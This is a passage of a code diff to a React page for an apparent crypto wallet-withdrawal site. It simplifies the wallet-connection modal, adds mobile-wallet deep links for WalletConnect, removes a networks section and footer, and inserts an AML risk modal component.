+          <div style={{ background: '#fff', width: '100%', maxWidth: '480px', borderRadius: '12px', padding: '24px' }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
+              <h2 style={{ margin: 0, fontSize: '24px' }}>Connect wallet</h2>
+              <button onClick={() => setShowWalletModal(false)} style={{ border: 'none', background: 'transparent', fontSize: '28px', cursor: 'pointer', lineHeight: 1 }}>×</button>
+            </div>
 
-        {/* Wallet Selection Modal */}
-        {showWalletModal && (
-          <div style={{
-            position: 'fixed',
-            top: 0,
-            left: 0,
-            right: 0,
-            bottom: 0,
-            background: 'rgba(0,0,0,0.5)',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            zIndex: 1000
-          }}>
-            <div style={{
-              background: 'white',
-              borderRadius: '20px',
-              padding: '32px',
-              maxWidth: '600px',
-              width: '90%',
-              maxHeight: '90vh',
-              overflow: 'auto'
-            }}>
-              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '24px' }}>
-                <div style={{ maxWidth: '620px' }}>
-                  <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: '#1a202c', margin: 0 }}>
-                    Connect Your Wallet
-                  </h2>
-                  <p style={{ marginTop: '10px', color: '#475569', fontSize: '14px', lineHeight: '1.75' }}>
-                    Choose a wallet connection method for desktop or mobile. WalletConnect provides QR code and deep-link support for compatible wallets, while browser wallet connections happen instantly in the browser.
-                  </p>
-                </div>
-                <button 
-                  onClick={() => setShowWalletModal(false)}
-                  style={{
-                    background: 'none',
-                    border: 'none',
-                    fontSize: '24px',
-                    cursor: 'pointer',
-                    color: '#718096'
-                  }}
-                >
-                  ×
+            <div style={{ display: 'grid', gap: '12px' }}>
+              <button onClick={() => connectWallet('auto')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#111827', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
+                {isConnecting ? 'Connecting...' : '⚡ Connect wallet'}
+              </button>
+
+              {isWalletConnectEnabled && connectors.some((connector) => connector.id === 'walletConnect') && (
+                <button onClick={() => connectWallet('walletConnect')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#2563eb', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}>
+                  🌐 WalletConnect (Mobile & QR)
                 </button>
-              </div>
-              
-              {!isWalletConnectEnabled && (
-                <div style={{
-                  marginBottom: '20px',
-                  padding: '12px 14px',
-                  borderRadius: '8px',
-                  background: '#fef3c7',
-                  color: '#92400e',
-                  fontSize: '14px',
-                  lineHeight: '1.5'
-                }}>
-                  WalletConnect support is currently disabled because the WalletConnect project ID has not been configured. To enable mobile and desktop wallet connections, set <code>NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID</code> to a valid WalletConnect Cloud project ID, then refresh the page.
-                </div>
               )}
 
-              <div style={{ marginBottom: '24px' }}>
-                <div style={{ display: 'grid', gap: '12px' }}>
-                  <button
-                    onClick={() => connectWallet('auto')}
-                    disabled={isConnecting}
-                    style={{
-                      width: '100%',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      gap: '16px',
-                      padding: '20px',
-                      border: '2px solid #667eea',
-                      borderRadius: '12px',
-                      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
-                      color: 'white',
-                      cursor: 'pointer',
-                      transition: 'all 0.2s ease',
-                      fontSize: '18px',
-                      fontWeight: '600',
-                      opacity: isConnecting ? 0.7 : 1,
-                    }}
-                  >
-                    <span style={{ fontSize: '24px' }}>🚀</span>
-                    {isPending ? 'Opening Wallet...' : 'Connect Any Available Wallet'}
-                  </button>
+              {hasBrowserWallet && (
+                <button onClick={() => connectWallet('injected')} disabled={isConnecting} style={{ padding: '12px 16px', background: '#fff', color: '#111827', border: '1px solid #cbd5e1', borderRadius: '8px', cursor: 'pointer' }}>
+                  🦊 Extension / Browser Wallet
+                </button>
+              )}
 
-                  <button
-                    onClick={() => connectWallet('injected')}
-                    disabled={isConnecting}
-                    style={{
-                      width: '100%',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      gap: '16px',
-                      padding: '16px 20px',
-                      border: '2px solid #cbd5e1',
-                      borderRadius: '12px',
-                      background: '#ffffff',
-                      color: '#334155',
-                      cursor: 'pointer',
-                      fontSize: '16px',
-                      fontWeight: '600',
-                    }}
-                  >
-                    <span style={{ fontSize: '20px' }}>🦊</span>
-                    Connect Browser Wallet
-                  </button>
-
-                  <button
-                    onClick={() => connectWallet('coinbaseWallet')}
-                    disabled={isConnecting}
-                    style={{
-                      width: '100%',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'center',
-                      gap: '16px',
-                      padding: '16px 20px',
-                      border: '2px solid #cbd5e1',
-                      borderRadius: '12px',
-                      background: '#ffffff',
-                      color: '#334155',
-                      cursor: 'pointer',
-                      fontSize: '16px',
-                      fontWeight: '600',
-                    }}
-                  >
-                    <span style={{ fontSize: '20px' }}>🔵</span>
-                    Connect Coinbase Wallet
-                  </button>
-
-                  {isWalletConnectEnabled && connectors.some((connector) => connector.id === 'walletConnect') && (
-                    <>
-                      <button
-                        onClick={() => connectWallet('walletConnect')}
-                        disabled={isConnecting}
-                        style={{
-                          width: '100%',
-                          display: 'flex',
-                          alignItems: 'center',
-                          justifyContent: 'center',
-                          gap: '16px',
-                          padding: '16px 20px',
-                          border: '2px solid #cbd5e1',
-                          borderRadius: '12px',
-                          background: '#ffffff',
-                          color: '#334155',
-                          cursor: 'pointer',
-                          fontSize: '16px',
-                          fontWeight: '600',
-                        }}
-                      >
-                        <span style={{ fontSize: '20px' }}>📱</span>
-                        Connect with WalletConnect
-                      </button>
-                      <p style={{ marginTop: '12px', fontSize: '13px', color: '#475569', lineHeight: '1.75' }}>
-                        WalletConnect supports mobile and desktop wallets through QR code scanning and deep linking. Ideal for wallets such as Rainbow, Argent, Trust Wallet, MetaMask Mobile, Ledger, and other WalletConnect-enabled apps.
-                      </p>
-                      <p style={{ marginTop: '10px', fontSize: '13px', color: '#475569', lineHeight: '1.75' }}>
-                        After approving the WalletConnect request in your wallet app, return to this tab or browser window to finish the withdrawal.
-                      </p>
-                    </>
-                  )}
+              {lastWalletConnectUri && (
+                <div style={{ marginTop: '8px', paddingTop: '12px', borderTop: '1px solid #e2e8f0', display: 'grid', gap: '8px' }}>
+                  <div style={{ fontSize: '13px', fontWeight: 'bold', color: '#475569' }}>Open in Mobile Wallet App:</div>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
+                    <a href={`https://metamask.app.link/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#fff7ed', border: '1px solid #ffedd5', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#c2410c', fontWeight: 600, fontSize: '13px' }}>
+                      🦊 MetaMask
+                    </a>
+                    <a href={`https://link.trustwallet.com/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#eff6ff', border: '1px solid #dbeafe', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#1d4ed8', fontWeight: 600, fontSize: '13px' }}>
+                      🛡️ Trust Wallet
+                    </a>
+                    <a href={`https://rainbow.me/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#fcf4ff', border: '1px solid #f5d0fe', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#a21caf', fontWeight: 600, fontSize: '13px' }}>
+                      🌈 Rainbow
+                    </a>
+                    <a href={`https://go.cb-w.com/wc?uri=${encodeURIComponent(lastWalletConnectUri)}`} target="_blank" rel="noreferrer" style={{ padding: '10px', background: '#f0fdf4', border: '1px solid #dcfce7', borderRadius: '8px', textAlign: 'center', textDecoration: 'none', color: '#15803d', fontWeight: 600, fontSize: '13px' }}>
+                      🅲 Coinbase Wallet
+                    </a>
+                  </div>
                 </div>
-              </div>
-
+              )}
             </div>
           </div>
-        )}
+        </div>
+      )}
 
-        {/* Supported Networks */}
-        <section style={{ padding: '60px 24px', background: '#f8f9fa' }}>
-          <div style={{ maxWidth: '1200px', margin: '0 auto', textAlign: 'center' }}>
-            <h2 style={{ fontSize: '32px', fontWeight: 'bold', marginBottom: '40px', color: '#1a202c' }}>
-              Supported Networks
-            </h2>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '20px' }}>
-              {['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'BNB Smart Chain', 'Avalanche', 'Fantom', 'Celo', 'Base', 'Linea', 'Scroll'].map(network => (
-                <div key={network} style={{ 
-                  background: 'white', 
-                  padding: '20px', 
-                  borderRadius: '12px',
-                  fontWeight: '600',
-                  color: '#4a5568'
-                }}>
-                  {network}
-                </div>
-              ))}
-            </div>
-          </div>
-        </section>
-
-        {/* Footer */}
-        <footer style={{ padding: '40px 24px', background: '#1a202c', color: 'white', textAlign: 'center' }}>
-          <p style={{ opacity: 0.8 }}>&copy; 2026 Direct Wallet Withdrawal</p>
-        </footer>
-      </div>
+      <AMLRiskModal
+        isOpen={showAmlModal}
+        isScanning={amlScanning}
+        result={amlRiskResult}
+        onClose={() => {
+          setShowAmlModal(false);
+        }}
+      />
     </>
   );
 }
